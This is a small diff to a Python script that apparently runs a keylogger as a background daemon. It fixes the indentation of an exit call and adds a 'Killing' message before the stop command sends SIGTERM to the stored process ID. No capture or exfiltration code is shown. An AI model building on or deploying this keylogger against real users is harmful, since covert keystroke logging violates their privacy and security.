@@ -75,12 +75,13 @@ if sys.argv[1] == 'start':
 
     except RuntimeError as err:
         print(err)
-    raise SystemExit('Exit Code: ' + str(1))
+        raise SystemExit('Exit Code: ' + str(1))
 
 # detect stop command and send signal to kill daemon
 elif sys.argv[1] == 'stop':
     if os.path.exists(pidFile):
         with open(pidFile) as fileHandler:
+            print("Killing")
             os.kill(int(fileHandler.read()),  signal.SIGTERM)
     else:
         print('Key logger is not currently running!')
